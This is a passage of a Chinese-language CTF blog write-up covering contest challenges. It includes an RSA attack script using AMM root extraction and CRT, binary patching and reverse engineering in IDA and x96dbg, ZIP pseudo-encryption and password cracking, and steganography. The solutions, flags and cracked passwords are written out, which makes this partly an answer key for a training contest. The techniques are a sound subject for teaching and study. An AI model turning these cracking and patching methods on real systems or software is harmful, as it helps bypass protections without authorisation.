class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">        p = <span class="number">1801</span> * random.getrandbits(<span class="number">1024</span>) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = gen()</span><br><span class="line">q = gen()</span><br><span class="line">e = <span class="number">1801</span></span><br><span class="line">n = p * q</span><br><span class="line">flag = <span class="string">b&#x27;njustCTF&#123;Incredibly_proficient_in_cryptography!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br></pre></td></tr></table></figure>
+
+<p>decrypt</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># AMM 开根</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">x, e, p</span>):</span><br><span class="line">    y = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(y, (p - <span class="number">1</span>) // e, p) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># p-1 = e^t*s</span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">    s = p // (e**t)</span><br><span class="line">    <span class="comment"># s|ralpha-1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> ((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (s * k + <span class="number">1</span>) // e</span><br><span class="line">    <span class="comment"># 计算 a = y^s b = x^s h =1</span></span><br><span class="line">    <span class="comment"># h 为 e 次非剩余部分的积</span></span><br><span class="line">    a = <span class="built_in">pow</span>(y, (e**(t - <span class="number">1</span>)) * s, p)</span><br><span class="line">    b = <span class="built_in">pow</span>(x, e * alpha - <span class="number">1</span>, p)</span><br><span class="line">    c = <span class="built_in">pow</span>(y, s, p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t - <span class="number">1</span>):</span><br><span class="line">        d = <span class="built_in">pow</span>(b, e**(t - <span class="number">1</span> - i), p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d, a)</span><br><span class="line">        b = b * (<span class="built_in">pow</span>(<span class="built_in">pow</span>(c, e, p), j, p))</span><br><span class="line">        h = h * <span class="built_in">pow</span>(c, j, p)</span><br><span class="line">        c = <span class="built_in">pow</span>(c, e, p)</span><br><span class="line">    <span class="comment"># return (pow(x, alpha * h, p)) % p</span></span><br><span class="line">    root = (<span class="built_in">pow</span>(x, alpha * h, p)) % p</span><br><span class="line">    roots = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        mp2 = root * <span class="built_in">pow</span>(a, i, p) % p</span><br><span class="line">        <span class="keyword">assert</span> (<span class="built_in">pow</span>(mp2, e, p) == x)</span><br><span class="line">        roots.add(mp2)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRTPAIR</span>(<span class="params">p, q, mp, mq</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> mpp <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mqq <span class="keyword">in</span> mq:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = <span class="built_in">int</span>(crt((p, q), (mpp, mqq))[<span class="number">0</span>])</span><br><span class="line">                solution = long_to_bytes(res)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;njustCTF&#x27;</span> <span class="keyword">in</span> solution:</span><br><span class="line">                    <span class="built_in">print</span>(solution)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(time.time() -</span><br><span class="line">                                                           start))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    e = <span class="number">1801</span></span><br><span class="line">    p = <span class="number">32565436141333317628219960894833688433505916392307251710516994251597206778761777339842246791406679210399052726549628583702584107828476801014912653431747982215176072906629412176240980365816863723591795344132303289706944773091030987937151397584021193988687079867816364109588875926643770165727892378267624953843281</span></span><br><span class="line">    q = <span class="number">67199565500170637780339318307098952016802828012090617620505563042259333296254225458444854088284689157563024051821250009927012374001042480886319230063623168048183485120465954366867058691443673087482506815712824772723242472377125772742651577168140341962088184069438887843038544942014293794694968172784788551872543</span></span><br><span class="line">    c = <span class="number">2186871468714234919008501617320364399241215931015368542618129582267571416054788996352437211075798603733210242516582476397173185207382099754591579715059072992212951863785968930903016456394119877688537460749034765986433636990801108749793734926528319356842888640987788813112849677262846775608132033323219847903269976203112741211283451874579640313591855945826655707291579008544037275256299525473758545495567202893073559975189550230508473149459209775004454158418947070893530433756732353800450563079322412688911771372272056282292233956164274370513338696519017367924126085893502674302301144673185036055665055657115085943847609517</span></span><br><span class="line"></span><br><span class="line">    n = p * q</span><br><span class="line"></span><br><span class="line">    cp = c % p</span><br><span class="line">    cq = c % q</span><br><span class="line">    mp = <span class="built_in">list</span>(AMM(cp, e, p))</span><br><span class="line">    mq = <span class="built_in">list</span>(AMM(cq, e, q))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start CRT...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mq), <span class="built_in">len</span>(mq) // <span class="number">8</span> + <span class="number">1</span>):</span><br><span class="line">        proc = multiprocessing.Process(target=CRTPAIR, args=(</span><br><span class="line">            p, q, mp, mq[i:i + <span class="built_in">len</span>(mq) // <span class="number">8</span> + <span class="number">1</span>]))</span><br><span class="line">        proc.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>e, phi 不互素的 AMM 开根，CRT 组合结果通过 flag 前缀判断结果。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jcbx_/article/details/105303760">https://blog.csdn.net/jcbx_/article/details/105303760</a></p>
+<p><a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1111.4877.pdf">https://arxiv.org/pdf/1111.4877.pdf</a></p>
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="easyIDA"><a href="#easyIDA" class="headerlink" title="easyIDA"></a>easyIDA</h2><p>打开IDA就有</p>
+<h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>IDA打开</p>
+<p>几个关键函数：</p>
+<p>fopen：打开了flag.txt文件，‘r’是读取，‘w’是写入</p>
+<p>ftell是查看有多少个字节，存放在ElementCount里</p>
+<p>malloc建立一个新空间，刚好是原文件两倍多一个字节</p>
+<p>看do while循环里内容</p>
+<p>奇数空间存放了原来文件的值，偶数空间存放了一个随机值</p>
+<p>现在用010打开文件flag.txt</p>
+<p><img src="/../images/image-20221014200004645.png" alt="image-20221014200004645"></p>
+<p>从上面代码可以发现，两个字节中间的是无效内容，把1，3，5，7，9，b,d,f列下所有字符删去就可以得到flag</p>
+<h2 id="easyPatch"><a href="#easyPatch" class="headerlink" title="easyPatch"></a>easyPatch</h2><p>IDA打开</p>
+<p><img src="/../images/image-20221014200240493.png" alt="image-20221014200240493"></p>
+<p>for 循环里是判断错误</p>
+<p>那直接把for全部删掉就可以获得正确的 flag 了</p>
+<p>X96dbg 打开，搜索字符串</p>
+<p>找到 you failed。。。这个字符串</p>
+<p><img src="/../images/image-20221014200445342.png" alt="image-20221014200445342"></p>
+<p>把这里全删了不就进入 you success 了吗</p>
+<p>右键，二进制，用 nop 填充</p>
+<p>F9运行程序获得 flag</p>
+<p>这里多出来一个坑就是直接f9程序会运行到结束</p>
+<p>来不及看到 flag 程序就运行结束了</p>
+<p><img src="/../images/image-20221014200714814.png" alt="image-20221014200714814"></p>
+<p>随便在下面下个断点或者一直f8都可以。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hello-misc"><a href="#hello-misc" class="headerlink" title="hello_misc"></a>hello_misc</h2><p>直接使用任一16进制编辑器打开 flag.png 图片，便可在末尾看到 flag：</p>
+<p><strong>flag{misc_is_a_part_of_ctf}</strong></p>
+<h2 id="hello-social-work"><a href="#hello-social-work" class="headerlink" title="hello_social_work"></a>hello_social_work</h2><p>依据“方圆8公里”及“大型商场”两个条件，在地图可找到“万达广场”。于是 flag 为：</p>
+<p><strong>flag{万达广场}</strong></p>
+<h2 id="hello-encrypted-zip"><a href="#hello-encrypted-zip" class="headerlink" title="hello_encrypted_zip"></a>hello_encrypted_zip</h2><p>使用任一16进制编辑器打开加密压缩包，检查其加密标志位，判定为伪加密。回复加密标志位便可得到flag：</p>
+<p><strong>flag{zip_have_many_possibilities}</strong></p>
+<h2 id="ez-encrypted-zip"><a href="#ez-encrypted-zip" class="headerlink" title="ez_encrypted_zip"></a>ez_encrypted_zip</h2><ol>
+<li>打开第一层加密压缩包，观察到其有 6byte text文件，联想到crc爆破，爆破得到密码：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PDFt2O</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>查看加密位，得知为伪加密。更改加密位，解压第二层压缩包</p>
+</li>
+<li><p>观察压缩包3，注意到压缩包内包外有相同文件，判定为明文爆破，得解压密码为：daf4vs</p>
+</li>
+<li><p>进入 flag.txt 文件，得：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ez_z</span><br><span class="line">... but what&#x27;s more? </span><br></pre></td></tr></table></figure>
+
+<p>为前半部分flag</p>
+<ol start="5">
+<li><em><strong>此处题目有误</strong></em></li>
+</ol>
+<p>zip 压缩时不会保留 ADS</p>
+<p>使用 lad 对 txt 文件进行判断，得到其为 ntfs 流隐写。查看得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip_Pseudo encryption&#125;</span><br></pre></td></tr></table></figure>
+
+<p>故flag为：<strong>flag{ez_zip_Pseudo encryption}</strong></p>
+<h2 id="ez-misc"><a href="#ez-misc" class="headerlink" title="ez_misc"></a>ez_misc</h2><ol>
+<li>此图片编码格式为 Aztec Code ，按格式补全二维码后扫码，得：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;misc</span><br><span class="line">...and another?</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><em><strong>此处题目有误</strong></em>：</li>
+</ol>
+<p>在构造题目时原先在第一步解出的字符串中放置了0宽字符隐写，然而在编码为图像时仅编码了可见字符，导致0宽字符所含信息丢失，导致题目错误。</p>
+<p>若原题正确，则得到 flag 为：</p>
+<p>flag{misc_do_you_like?}</p>
+<p><strong>出题人在此致歉。</strong></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8D%97%E4%BA%AC%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E8%90%8C%E6%96%B0%E6%9D%AF/" rel="tag"># 南京理工大学萌新杯</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/p/44961621.html" rel="next" title="NUSTCTF2022">
+                  NUSTCTF2022 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">C.A.T.</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
